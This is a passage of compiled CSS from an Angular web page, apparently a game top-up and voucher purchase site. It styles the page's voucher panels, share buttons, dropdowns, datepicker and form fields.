        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
            font-size: 16px;
            font-family: Montserrat;
            color: #a6a6b2 !important
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] ol[_ngcontent-gtc-c19] {
            padding-left: 19px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] ol[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] {
            padding-left: 10px;
            color: #a6a6b2 !important;
            font-size: 16px;
            font-family: Montserrat;
            line-height: 1.5
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] ol[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
            color: #a6a6b2 !important
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] {
            font-family: Montserrat-bold, Arial
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] h4[_ngcontent-gtc-c19] span[_ngcontent-gtc-c19] {
            display: inline
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .grayLight[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .grayLight[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] {
            font-size: 16px;
            font-family: Montserrat;
            color: #a6a6b2 !important;
            line-height: 1.5
        }

        @media (max-width:991px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .title[_ngcontent-gtc-c19] {
                max-width: unset;
                font-size: 16px;
                margin-top: 15px;
                margin-bottom: 10px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .wrapper-gameInfo[_ngcontent-gtc-c19] .descTitle[_ngcontent-gtc-c19] {
                font-size: 16px;
                padding-bottom: 0;
                border: 0
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .col-md-6[_ngcontent-gtc-c19] {
                display: table-cell;
                width: 50%;
                padding: 0
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] h3[_ngcontent-gtc-c19] {
                font-size: 16px
            }
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .grayLight[_ngcontent-gtc-c19],
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .grayLight[_ngcontent-gtc-c19] li[_ngcontent-gtc-c19] {
                font-size: 12px
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #descWrapper[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #rulesWrapper[_ngcontent-gtc-c19] {
            position: relative;
            overflow: hidden;
            transition: all .3s ease-in-out
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #descWrapper[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #rulesWrapper[_ngcontent-gtc-c19] p[_ngcontent-gtc-c19] {
            text-align: left
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #descWrapper[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #rulesWrapper[_ngcontent-gtc-c19] ul[_ngcontent-gtc-c19] {
            padding: 0 20px;
            margin: 0 0 20px
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #descWrapper.desc-max[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #descWrapper.rules-max[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #rulesWrapper.desc-max[_ngcontent-gtc-c19],
        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #rulesWrapper.rules-max[_ngcontent-gtc-c19] {
            position: relative
        }

        @media (max-width:767px) {
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #descWrapper.desc-shade[_ngcontent-gtc-c19]:after,
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #descWrapper.rules-shade[_ngcontent-gtc-c19]:after,
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #rulesWrapper.desc-shade[_ngcontent-gtc-c19]:after,
            .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] #rulesWrapper.rules-shade[_ngcontent-gtc-c19]:after {
                position: absolute;
                content: "";
                bottom: 0;
                left: 0;
                right: 0;
                height: 220px
            }
        }

        .container-wrapper-topup[_ngcontent-gtc-c19] .payment-voucher[_ngcontent-gtc-c19] .description-toggle[_ngcontent-gtc-c19] {
            display: none;
            font-family: Montserrat-Bold;
            color: #fff;
            padding: 12px 0;
            border: none;
            background-color: #161619
        }
    </style>
    <style type="text/css">
        /*
  @angular/flex-layout - workaround for possible browser quirk with mediaQuery listeners
  see http://bit.ly/2sd4HMP
*/

        @media screen and (min-width: 600px),
        screen and (min-width: 960px),
        screen and (min-width: 1280px),
        screen and (min-width: 1920px),
        screen and (min-width: 1920px) and (max-width: 4999.99px),
        screen and (max-width: 1919.99px),
        screen and (min-width: 1280px) and (max-width: 1919.99px),
        screen and (max-width: 1279.99px),
        screen and (min-width: 960px) and (max-width: 1279.99px),
        screen and (max-width: 959.99px),
        screen and (min-width: 600px) and (max-width: 959.99px),
        screen and (max-width: 599.99px),
        screen and (min-width: 0px) and (max-width: 599.99px),
        print {
            .fx-query-test {}
        }
    </style>
    <style>
        .sb-button,
        .sb-group {
            display: inline-flex;
            align-items: flex-start
        }

        .sb-group {
            flex-wrap: wrap
        }

        .sb-button {
            margin: .3125em
        }

        .sb-wrapper {
            font-size: inherit;
            cursor: pointer;
            position: relative;
            outline: 0;
            min-width: 4.125em;
            height: 2.5em;
            border: none;
            border-radius: 1px;
            padding: 0;
            line-height: 2.571em;
            background-color: transparent
        }

        .sb-wrapper .sb-count,
        .sb-wrapper .sb-icon,
        .sb-wrapper .sb-text {
            display: flex;
            align-items: center;
            justify-content: center;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none
        }

        .sb-wrapper .sb-inner {
            display: flex;
            flex: 1;
            width: 100%;
            height: 100%
        }

        .sb-wrapper .sb-content {
            display: flex;
            height: 100%;
            width: 100%
        }

        .sb-wrapper .sb-text {
            padding: 0 .7em;
            flex: 1;
            height: 100%;
            white-space: nowrap
        }

        .sb-wrapper .sb-icon {
            text-align: center;
            width: 100%;
            height: 100%;
            font-size: 1.2em;
            min-width: 2em
        }

        .sb-wrapper .sb-count {
            font-size: .9em;
            padding: 0 .7em
        }

        .sb-wrapper .sb-count,
        .sb-wrapper .sb-text {
            font-weight: 700
        }

        .sb-show-text .sb-icon {
            width: 2em
        }

        .sb-show-count {
            min-width: 5.333em
        }
    </style>
    <style>
        .justify-content-left[_ngcontent-gtc-c24] {
            justify-content: left !important
        }

        .justify-content-center[_ngcontent-gtc-c24] {
            justify-content: center !important
        }

        .justify-content-right[_ngcontent-gtc-c24] {
            justify-content: right !important
        }

        .justify-content-space-between[_ngcontent-gtc-c24] {
            justify-content: space-between !important
        }

        .justify-content-flex-end[_ngcontent-gtc-c24] {
            justify-content: flex-end !important
        }

        .text-decoration-line-through[_ngcontent-gtc-c24] {
            text-decoration: line-through !important
        }

        .text-decoration-underline[_ngcontent-gtc-c24] {
            text-decoration: underline !important
        }

        .text-decoration-overline[_ngcontent-gtc-c24] {
            text-decoration: overline !important
        }

        .text-decoration-none[_ngcontent-gtc-c24] {
            text-decoration: none !important
        }

        .align-self-center[_ngcontent-gtc-c24] {
            align-self: center
        }

        .cursor-no-drop[_ngcontent-gtc-c24] {
            cursor: no-drop !important
        }

        .cursor-pointer[_ngcontent-gtc-c24] {
            cursor: pointer !important
        }

        .text-left[_ngcontent-gtc-c24] {
            text-align: left !important
        }

        .text-center[_ngcontent-gtc-c24] {
            text-align: center !important
        }

        .text-right[_ngcontent-gtc-c24] {
            text-align: right !important
        }

        .text-justify[_ngcontent-gtc-c24] {
            text-align: justify !important
        }

        .v-align-top[_ngcontent-gtc-c24] {
            vertical-align: top !important
        }

        .v-align-middle[_ngcontent-gtc-c24] {
            vertical-align: middle !important
        }

        .v-align-bottom[_ngcontent-gtc-c24] {
            vertical-align: bottom !important
        }

        .float-left[_ngcontent-gtc-c24] {
            float: left !important
        }

        .float-right[_ngcontent-gtc-c24] {
            float: right !important
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c24] button.mat-icon-button[_ngcontent-gtc-c24] {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c24] button.mat-icon-button[_ngcontent-gtc-c24] span.mat-button-wrapper[_ngcontent-gtc-c24],
        .mat-datepicker-toggle[_ngcontent-gtc-c24] button.mat-icon-button[_ngcontent-gtc-c24] span.mat-button-wrapper[_ngcontent-gtc-c24] svg.mat-datepicker-toggle-default-icon[_ngcontent-gtc-c24] {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown[_ngcontent-gtc-c24] {
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c24] i.fa-caret-down[_ngcontent-gtc-c24] {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown[_ngcontent-gtc-c24] input[type=text][_ngcontent-gtc-c24] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown[_ngcontent-gtc-c24] .cust-option[_ngcontent-gtc-c24] {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown[_ngcontent-gtc-c24] .cust-option.active[_ngcontent-gtc-c24] {
            display: block
        }

        .cust-dropdown[_ngcontent-gtc-c24] .cust-option[_ngcontent-gtc-c24] ul.option-list[_ngcontent-gtc-c24] {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown[_ngcontent-gtc-c24] .cust-option[_ngcontent-gtc-c24] ul.option-list[_ngcontent-gtc-c24] li[_ngcontent-gtc-c24] {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c24] .cust-option[_ngcontent-gtc-c24] ul.option-list[_ngcontent-gtc-c24] li[_ngcontent-gtc-c24] label[_ngcontent-gtc-c24] {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown[_ngcontent-gtc-c24] .cust-option[_ngcontent-gtc-c24] ul.option-list[_ngcontent-gtc-c24] li[_ngcontent-gtc-c24] label[_ngcontent-gtc-c24]:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c24] .cust-option[_ngcontent-gtc-c24] ul.option-list[_ngcontent-gtc-c24] li[_ngcontent-gtc-c24] label[_ngcontent-gtc-c24]:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c24] .cust-option[_ngcontent-gtc-c24] ul.option-list[_ngcontent-gtc-c24] li[_ngcontent-gtc-c24] input[type=radio][_ngcontent-gtc-c24] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown[_ngcontent-gtc-c24] .cust-option[_ngcontent-gtc-c24] ul.option-list[_ngcontent-gtc-c24] li[_ngcontent-gtc-c24] input[type=radio][_ngcontent-gtc-c24]:checked+label[_ngcontent-gtc-c24]:after {
            opacity: 1
        }

        html[_ngcontent-gtc-c24] {
            scroll-behavior: smooth
        }

        body[_ngcontent-gtc-c24] {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a[_ngcontent-gtc-c24],
        label[_ngcontent-gtc-c24],
        ol[_ngcontent-gtc-c24] li[_ngcontent-gtc-c24],
        table[_ngcontent-gtc-c24] td[_ngcontent-gtc-c24],
        table[_ngcontent-gtc-c24] th[_ngcontent-gtc-c24],
        ul[_ngcontent-gtc-c24] li[_ngcontent-gtc-c24] {
            font-family: Montserrat
        }

        b[_ngcontent-gtc-c24] {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1[_ngcontent-gtc-c24],
        h2[_ngcontent-gtc-c24],
        h3[_ngcontent-gtc-c24],
        h4[_ngcontent-gtc-c24],
        h5[_ngcontent-gtc-c24],
        h6[_ngcontent-gtc-c24],
        p[_ngcontent-gtc-c24],
        span[_ngcontent-gtc-c24] {
            margin: 0;
            font-family: Montserrat
        }

        button[_ngcontent-gtc-c24] {
            outline: 0;
            font-family: Montserrat
        }

        input[_ngcontent-gtc-c24],
        textarea[_ngcontent-gtc-c24] {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label[_ngcontent-gtc-c24] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label[_ngcontent-gtc-c24] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input[_ngcontent-gtc-c24] {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input[_ngcontent-gtc-c24] {
                font-size: 11px
            }
        }

        label.label-media[_ngcontent-gtc-c24] {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid[_ngcontent-gtc-c24] {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid[_ngcontent-gtc-c24] span[_ngcontent-gtc-c24] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap[_ngcontent-gtc-c24] {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap[_ngcontent-gtc-c24] p[_ngcontent-gtc-c24] {
            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap[_ngcontent-gtc-c24] p[_ngcontent-gtc-c24] {
                font-size: .75em
            }
        }

        .close-circle-wrap[_ngcontent-gtc-c24] p.close-circle[_ngcontent-gtc-c24] {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap[_ngcontent-gtc-c24] p.close-circle[_ngcontent-gtc-c24] span[_ngcontent-gtc-c24] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate[_ngcontent-gtc-c24] {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c24] {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c24] span[_ngcontent-gtc-c24] {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent[_ngcontent-gtc-c24] {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white[_ngcontent-gtc-c24] {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey[_ngcontent-gtc-c24] {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame[_ngcontent-gtc-c24] {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c24] span[_ngcontent-gtc-c24] {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c24] p[_ngcontent-gtc-c24] {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame[_ngcontent-gtc-c24] p[_ngcontent-gtc-c24] {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c24] {
                right: 10px
            }
            a.close-frame[_ngcontent-gtc-c24] p[_ngcontent-gtc-c24] {
                display: none
            }
        }

        a.close-frame[_ngcontent-gtc-c24] span[_ngcontent-gtc-c24] {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

        .form-control[_ngcontent-gtc-c24] {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default[_ngcontent-gtc-c24] {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count[_ngcontent-gtc-c24] {
            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent[_ngcontent-gtc-c24] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea[_ngcontent-gtc-c24] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control[_ngcontent-gtc-c24]::-moz-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c24]::-ms-input-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c24]::placeholder {
            color: #69707e
        }

        .header-text[_ngcontent-gtc-c24] h3[_ngcontent-gtc-c24] {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c24] span[_ngcontent-gtc-c24] {
                right: 10px
            }
            .header-text[_ngcontent-gtc-c24] h3[_ngcontent-gtc-c24] {
                font-size: 1.5em
            }
        }

        .header-text[_ngcontent-gtc-c24] h4[_ngcontent-gtc-c24] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text[_ngcontent-gtc-c24] p[_ngcontent-gtc-c24] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium[_ngcontent-gtc-c24] h3[_ngcontent-gtc-c24] {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small[_ngcontent-gtc-c24] h3[_ngcontent-gtc-c24] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium[_ngcontent-gtc-c24] h3[_ngcontent-gtc-c24],
            .header-text-small[_ngcontent-gtc-c24] h3[_ngcontent-gtc-c24] {
                font-size: 1.5em
            }
        }

        .header-text-extra-small[_ngcontent-gtc-c24] h3[_ngcontent-gtc-c24] {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small[_ngcontent-gtc-c24] h3[_ngcontent-gtc-c24] {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold[_ngcontent-gtc-c24] h3[_ngcontent-gtc-c24] {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text[_ngcontent-gtc-c24] p[_ngcontent-gtc-c24] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text[_ngcontent-gtc-c24] p[_ngcontent-gtc-c24] {
            font-size: 1em;
            color: #fff
        }

        .radio-input[_ngcontent-gtc-c24] {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top[_ngcontent-gtc-c24] {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft[_ngcontent-gtc-c24] {
            float: left
        }

        .fright[_ngcontent-gtc-c24] {
            float: right
        }

        .row[_ngcontent-gtc-c24] .padding-left-0[_ngcontent-gtc-c24] {
            padding-left: 0
        }

        .form-group.form-group--media[_ngcontent-gtc-c24] {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected[_ngcontent-gtc-c24] {
            background: 0 0
        }

        .invalid-feedback[_ngcontent-gtc-c24] {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle[_ngcontent-gtc-c24] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle[_ngcontent-gtc-c24]:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle[_ngcontent-gtc-c24] .shuffle-container[_ngcontent-gtc-c24] {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle[_ngcontent-gtc-c24] .shuffle-container[_ngcontent-gtc-c24]>.row[_ngcontent-gtc-c24] {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle[_ngcontent-gtc-c24] .shuffle-container[_ngcontent-gtc-c24] .shuffle-pop-table[_ngcontent-gtc-c24] {
            display: table
        }

        .popup-shuffle[_ngcontent-gtc-c24] .shuffle-container[_ngcontent-gtc-c24] .shuffle-pop-table[_ngcontent-gtc-c24] .shuffle-pop-item[_ngcontent-gtc-c24] {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle[_ngcontent-gtc-c24] .shuffle-container[_ngcontent-gtc-c24] .shuffle-pop-table[_ngcontent-gtc-c24] .shuffle-pop-item.img[_ngcontent-gtc-c24] {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle[_ngcontent-gtc-c24] .shuffle-container[_ngcontent-gtc-c24] img[_ngcontent-gtc-c24] {
            max-width: 100%
        }

        .popup-shuffle[_ngcontent-gtc-c24] .shuffle-container[_ngcontent-gtc-c24] p[_ngcontent-gtc-c24] {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle[_ngcontent-gtc-c24] .shuffle-container[_ngcontent-gtc-c24] p[_ngcontent-gtc-c24] strong[_ngcontent-gtc-c24] {
            font-size: 1.09em
        }

        .mat-datepicker-content[_ngcontent-gtc-c24] {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content[_ngcontent-gtc-c24] {
            color: #fff
        }

        .mat-calendar-body-disabled[_ngcontent-gtc-c24]>.mat-calendar-body-cell-content[_ngcontent-gtc-c24]:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label[_ngcontent-gtc-c24],
        .mat-calendar-table-header[_ngcontent-gtc-c24] th[_ngcontent-gtc-c24],
        .mat-datepicker-content[_ngcontent-gtc-c24] .mat-calendar-next-button[_ngcontent-gtc-c24],
        .mat-datepicker-content[_ngcontent-gtc-c24] .mat-calendar-previous-button[_ngcontent-gtc-c24],
        .mat-datepicker-toggle[_ngcontent-gtc-c24],
        .mat-icon-button[disabled][disabled][_ngcontent-gtc-c24] {
            color: #fff
        }

        .mat-calendar-arrow[_ngcontent-gtc-c24] {
            border-top-color: #fff
        }

        .mat-calendar-header[_ngcontent-gtc-c24] {
            color: #fff
        }

        .cdk-keyboard-focused[_ngcontent-gtc-c24] .mat-calendar-body-active[_ngcontent-gtc-c24]>.mat-calendar-body-cell-content[_ngcontent-gtc-c24]:not(.mat-calendar-body-selected),
        .cdk-program-focused[_ngcontent-gtc-c24] .mat-calendar-body-active[_ngcontent-gtc-c24]>.mat-calendar-body-cell-content[_ngcontent-gtc-c24]:not(.mat-calendar-body-selected),
        .mat-calendar-body-cell[_ngcontent-gtc-c24]:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content[_ngcontent-gtc-c24]:not(.mat-calendar-body-selected),
        .mat-calendar-body-today[_ngcontent-gtc-c24]:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected[_ngcontent-gtc-c24] {
            background: #d0021b;
            box-shadow: none
        }

        .block-url[_ngcontent-gtc-c24] {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold[_ngcontent-gtc-c24] h3[_ngcontent-gtc-c24] {
                font-size: 1em
            }
            .fleft[_ngcontent-gtc-c24] {
                float: right
            }
            .fright[_ngcontent-gtc-c24] {
                float: left
            }
            .popup-shuffle[_ngcontent-gtc-c24] .shuffle-container[_ngcontent-gtc-c24] .shuffle-pop-table[_ngcontent-gtc-c24] {
                padding: 0 20px
            }
            .mat-datepicker-toggle[_ngcontent-gtc-c24] button.mat-icon-button[_ngcontent-gtc-c24] {
                top: auto;
                bottom: 7px
            }
            .section-other-voucher[_ngcontent-gtc-c24] .card-voucher[_ngcontent-gtc-c24] {
                width: 100%
            }
        }

        .mat-primary[_ngcontent-gtc-c24] .mat-option.mat-selected[_ngcontent-gtc-c24]:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel[_ngcontent-gtc-c24] .mat-option[_ngcontent-gtc-c24] {
            color: #797979
        }

        .ngx-editor-textarea[_ngcontent-gtc-c24] div[_ngcontent-gtc-c24],
        .ngx-editor-textarea[_ngcontent-gtc-c24] section[_ngcontent-gtc-c24] {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c24] div[_ngcontent-gtc-c24] img[_ngcontent-gtc-c24],
        .ngx-editor-textarea[_ngcontent-gtc-c24] section[_ngcontent-gtc-c24] img[_ngcontent-gtc-c24] {
            width: 100% !important
        }

